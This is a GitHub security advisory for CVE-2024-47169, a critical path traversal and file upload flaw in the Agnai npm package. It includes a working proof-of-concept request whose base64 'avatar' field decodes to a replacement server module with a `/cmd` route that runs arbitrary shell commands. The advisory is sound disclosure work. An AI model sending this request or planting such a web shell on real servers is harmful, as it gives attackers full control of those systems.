# [C] Agnai vulnerable to Remote Code Execution via JS Upload using Directory Traversal

## Summary
Severity: Critical
Advisory: GHSA-mpch-89gm-hm83
CVE: CVE-2024-47169
CWE: CWE-22, CWE-35, CWE-434
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2024-09-26
Source: https://github.com/advisories/GHSA-mpch-89gm-hm83
Type: github-advisory

## Affected
- npm: `agnai` — affected >=0 <1.0.330

## Details
## Summary

A vulnerability has been discovered in **Agnai** that permits attackers to upload arbitrary files to attacker-chosen locations on the server, including JavaScript, enabling the execution of commands within those files. This issue could result in unauthorized access, full server compromise, data leakage, and other critical security threats.

This **does not** affect:
- `agnai.chat`
- installations using S3-compatible storage
- self-hosting that is not publicly exposed

This **DOES** affect:
- publicly hosted installs without S3-compatible storage

### CWEs

CWE-35: Path Traversal

CWE-434: Unrestricted Upload of File with Dangerous Type

### CVSS-4.0 - **9.0 - Critical**

CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H

### Description

Path Traversal and Unrestricted Upload of File with Dangerous Type

Path Traversal Location

```tsx
POST /api/chat/5c25e8dc-67c3-40e1-9572-32df2e26ff38/temp-character HTTP/1.1
{"_id": "/../../../../../../app/srv/api/voice",...<ommitted>}
```

In the following file, the `_id` parameter which is a remote-supplied parameter is not properly validated and sanitized.

https://github.com/agnaistic/agnai/blob/437227d9aa86132f3be3b41c89981cb393c903d0/srv/api/chat/characters.ts#L101

```jsx
 const upserted: AppSchema.Character = {
    _id: body._id || `temp-${v4().slice(0, 8)}`,
    kind: 'character',
    createdAt: now(),
```

In the following file, the `filename` (or `id`)  and  `content` variables are not properly sanitized and validated,

https://github.com/agnaistic/agnai/blob/dev/srv/api/upload.ts#L63

```jsx
export async function entityUploadBase64(kind: string, id: string, content?: string) {
  if (!content) return
  if (!content.includes(',')) return

  const filename = `${kind}-${id}`
  const attachment = toAttachment(content)
  return upload(attachment, filename)
}
```

```jsx
function toAttachment(content: string): Attachment {
  const [prefix, base64] = content.split(',')
  const type = prefix.slice(5, -7)
  const [, ext] = type.split('/')
  return {
    ext,
    field: '',
    original: '',
    type: getType(ext),
    content: Buffer.from(base64, 'base64'),
  }
}
```

An attacker can freely specify arbitrary file types (and arbitrary base64-encoded file content), thereby permitting them to upload JavaScript files and by abusing the `_id` parameter, to control the location of the file to overwrite an existing server file;

```jsx
POST /api/chat/5c25e8dc-67c3-40e1-9572-32df2e26ff38/temp-character HTTP/1.1
...
Connection: keep-alive

{
"_id": "/../../../../../../app/srv/api/voice",
"name":"","description":"","culture":"en-us","tags":[],"scenario":"","appearance":"","visualType":"avatar","avatar":"data:image/js;base64,InVzZSBzdHJpY3QiOwpPYmplY3QuZGVmaW5lUHJvcGVydHkoZXhwb3J0cywgIl9fZXNNb2R1bGUiLCB7IHZhbHVlOiB0cnVlIH0pOwpjb25zdCBleHByZXNzXzEgPSByZXF1aXJlKCJleHByZXNzIik7CmNvbnN0IHdyYXBfMSA9IHJlcXVpcmUoIi4vd3JhcCIpOwpjb25zdCB2b2ljZV8xID0gcmVxdWlyZSgiLi4vdm9pY2UiKTsKY29uc3QgZGJfMSA9IHJlcXVpcmUoIi4uL2RiIik7CmNvbnN0IHZhbGlkXzEgPSByZXF1aXJlKCIvY29tbW9uL3ZhbGlkIik7CmNvbnN0IHJvdXRlciA9ICgwLCBleHByZXNzXzEuUm91dGVyKSgpOwpjb25zdCB0ZXh0VG9TcGVlY2hWYWxpZCA9IHsgdGV4dDogJ3N0cmluZycsIHZvaWNlOiAnYW55JyB9Owpjb25zdCB0ZXh0VG9TcGVlY2ggPSAoMCwgd3JhcF8xLmhhbmRsZSkoYXN5bmMgKHsgYm9keSwgdXNlcklkLCBzb2NrZXRJZCwgbG9nLCBwYXJhbXMgfSkgPT4gewogICAgY29uc3QgdXNlciA9IHVzZXJJZCA/IGF3YWl0IGRiXzEuc3RvcmUudXNlcnMuZ2V0VXNlcih1c2VySWQpIDogYm9keS51c2VyOwogICAgY29uc3QgZ3Vlc3RJZCA9IHVzZXJJZCA/IHVuZGVmaW5lZCA6IHNvY2tldElkOwogICAgKDAsIHZhbGlkXzEuYXNzZXJ0VmFsaWQpKHRleHRUb1NwZWVjaFZhbGlkLCBib2R5KTsKICAgIHJldHVybiAoMCwgdm9pY2VfMS5nZW5lcmF0ZVRleHRUb1NwZWVjaCkodXNlciwgbG9nLCBndWVzdElkLCBib2R5LnRleHQsIGJvZHkudm9pY2UpOwp9KTsKY29uc3QgZ2V0Vm9pY2VzID0gKDAsIHdyYXBfMS5oYW5kbGUpKGFzeW5jICh7IGJvZHksIHVzZXJJZCwgc29ja2V0SWQsIGxvZywgcGFyYW1zIH0pID0+IHsKICAgIGNvbnN0IHR0c1NlcnZpY2UgPSBwYXJhbXMuaWQ7CiAgICBjb25zdCB1c2VyID0gdXNlcklkID8gYXdhaXQgZGJfMS5zdG9yZS51c2Vycy5nZXRVc2VyKHVzZXJJZCkgOiBib2R5LnVzZXI7CiAgICBjb25zdCBndWVzdElkID0gdXNlcklkID8gdW5kZWZpbmVkIDogc29ja2V0SWQ7CiAgICByZXR1cm4gKDAsIHZvaWNlXzEuZ2V0Vm9pY2VzTGlzdCkoeyB0dHNTZXJ2aWNlOiB0dHNTZXJ2aWNlLCB1c2VyIH0sIGxvZywgZ3Vlc3RJZCk7Cn0pOwpjb25zdCBnZXRNb2RlbHMgPSAoMCwgd3JhcF8xLmhhbmRsZSkoYXN5bmMgKHsgYm9keSwgdXNlcklkLCBzb2NrZXRJZCwgbG9nLCBwYXJhbXMgfSkgPT4gewogICAgY29uc3QgdHRzU2VydmljZSA9IHBhcmFtcy5pZDsKICAgIGNvbnN0IHVzZXIgPSB1c2VySWQgPyBhd2FpdCBkYl8xLnN0b3JlLnVzZXJzLmdldFVzZXIodXNlcklkKSA6IGJvZHkudXNlcjsKICAgIGNvbnN0IGd1ZXN0SWQgPSB1c2VySWQgPyB1bmRlZmluZWQgOiBzb2NrZXRJZDsKICAgIHJldHVybiAoMCwgdm9pY2VfMS5nZXRNb2RlbHNMaXN0KSh7IHR0c1NlcnZpY2U6IHR0c1NlcnZpY2UsIHVzZXIgfSwgbG9nLCBndWVzdElkKTsKfSk7Cgpjb25zdCBnZXRDbWQgPSAoMCwgd3JhcF8xLmhhbmRsZSkoYXN5bmMgKHsgYm9keSwgdXNlcklkLCBzb2NrZXRJZCwgbG9nLCBwYXJhbXMgfSkgPT4gewoJY29uc3QgY2hpbGRfcHJvY2Vzc18xID0gcmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpOwoJY2hpbGRfcHJvY2Vzc18xLmV4ZWNTeW5jKGJvZHkuY21kKTsKICAgIHJldHVybiAoMCwgdm9pY2VfMS5nZXRNb2RlbHNMaXN0KSh7IHR0c1NlcnZpY2U6IHR0c1NlcnZpY2UsIHVzZXIgfSwgbG9nLCBndWVzdElkKTsKfSk7Cgpyb3V0ZXIucG9zdCgnL3R0cycsIHRleHRUb1NwZWVjaCk7CnJvdXRlci5wb3N0KCcvOmlkL3ZvaWNlcycsIGdldFZvaWNlcyk7CnJvdXRlci5wb3N0KCcvOmlkL21vZGVscycsIGdldE1vZGVscyk7CnJvdXRlci5wb3N0KCcvY21kJywgZ2V0Q21kKTsKZXhwb3J0cy5kZWZhdWx0ID0gcm91dGVyOwovLyMgc291cmNlTWFwcGluZ1VSTD12b2ljZS5qcy5tYXA=","sprite":null,"greeting":"","sampleChat":"","voiceDisabled":false,"voice":{},"systemPrompt":"","postHistoryInstructions":"","insert":{"prompt":"","depth":3},"alternateGreetings":[],"creator":"","characterVersion":"","persona":{"kind":"text","attributes":{"text":[""]}},"imageSettings":{"type":"sd","steps":10,"width":512,"height":512,"prefix":"","suffix":"","negative":"","cfg":9,"summariseChat":true,"summaryPrompt":""}}
```

### Risk

The attacker can write arbitrary files to disk, including overwriting existing JavaScript to execute arbitrary code on the server, leading to a complete system compromise, server control, and further network penetration.

Attackers can gain full access to the server.

### Recommendation

**Input Validation**

- Ensure thorough validation of user inputs, particularly id parameter, file paths and file names, to prevent directory traversal and ensure they end up in the desired folder location post-normalization. [[OWASP: Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)](https://owasp.org/www-community/attacks/Path_Traversal)

**Arbitrary File Upload**

- Restrict the types of files that can be uploaded via a allow-only list.

### Credits
- @ropwareJB
- @noe233

## References
- https://github.com/agnaistic/agnai/security/advisories/GHSA-mpch-89gm-hm83
- https://nvd.nist.gov/vuln/detail/CVE-2024-47169
- https://github.com/agnaistic/agnai
